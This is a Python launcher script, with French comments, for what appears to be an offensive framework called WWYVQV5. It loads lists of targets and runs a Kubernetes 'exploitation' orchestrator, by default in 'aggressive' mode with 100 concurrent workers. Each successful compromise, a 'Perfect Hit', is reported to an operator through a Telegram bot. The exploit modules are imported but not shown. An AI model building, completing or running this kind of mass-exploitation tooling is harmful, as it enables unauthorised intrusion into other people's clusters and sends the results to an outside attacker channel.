#!/usr/bin/env python3
"""
WWYVQV5 - Script principal avec Perfect Hits Telegram
Date: 2025-06-23 21:15:45 UTC
User: wKayaa
"""

import asyncio
import argparse
import sys
from datetime import datetime  # AJOUT MANQUANT
from pathlib import Path

# Import local avec nouveau système
from kubernetes_advanced import (
    ExploitationConfig,
    ExploitationMode,
    WWYVQv5KubernetesOrchestrator
)
from telegram_perfect_hits import WWYVQv5TelegramFixed

def parse_arguments():
    parser = argparse.ArgumentParser(description="🚀 WWYVQV5 - Perfect Hits System")
    
    parser.add_argument('--target', '-t', help='Cible unique')
    parser.add_argument('--targets', '-f', help='Fichier de cibles')
    parser.add_argument('--mode', '-m', choices=['passive', 'active', 'aggressive'], 
                       default='aggressive', help='Mode d\'exploitation')
    parser.add_argument('--max-concurrent', type=int, default=100)
    parser.add_argument('--timeout', type=int, default=10)
    parser.add_argument('--verbose', '-v', action='store_true')
    
    # Telegram Perfect Hits
    parser.add_argument('--telegram-token', help='Bot token Telegram')
    parser.add_argument('--telegram-chat-id', help='Chat ID Telegram')
    
    return parser.parse_args()

def load_targets(args):
    targets = []
    
    if args.target:
        targets.append(args.target)
    elif args.targets:
        try:
            with open(args.targets, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        targets.append(line)
        except FileNotFoundError:
            print(f"❌ Fichier non trouvé: {args.targets}")
            return []
    else:
        print("❌ Aucune cible spécifiée")
        return []
    
    return targets

async def main():
    args = parse_arguments()
    
    # Configuration
    config = ExploitationConfig(
        mode=ExploitationMode.AGGRESSIVE if args.mode == 'aggressive' else ExploitationMode.PASSIVE,
        max_concurrent_clusters=args.max_concurrent,
        timeout_per_operation=args.timeout
    )
    
    # Chargement des cibles
    targets = load_targets(args)
    if not targets:
        sys.exit(1)
    
    print(f"🎯 {len(targets)} cibles chargées")
    
    # Framework Enhanced avec Perfect Hits
    framework = WWYVQv5TelegramFixed(
        config, 
        args.telegram_token, 
        args.telegram_chat_id
    )
    
    # Message de démarrage
    if framework.telegram:
        start_message = f"""🚀 WWYV4Q Perfect v3.0 - SESSION START
📅 {datetime.utcnow().isoformat()}
👤 Operator: wKayaa
🎯 Targets: {len(targets)}
⚡ Workers: {args.max_concurrent}
🔥 Mode: {args.mode.upper()}

Ready for Perfect Hits! 💎"""
        
        await framework.telegram._send_telegram_message(start_message)
    
    # Exploitation avec Perfect Hits
    await framework.run_exploitation(targets)
    framework.print_summary()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️  Arrêt demandé")
    except Exception as e:
        print(f"❌ Erreur: {str(e)}")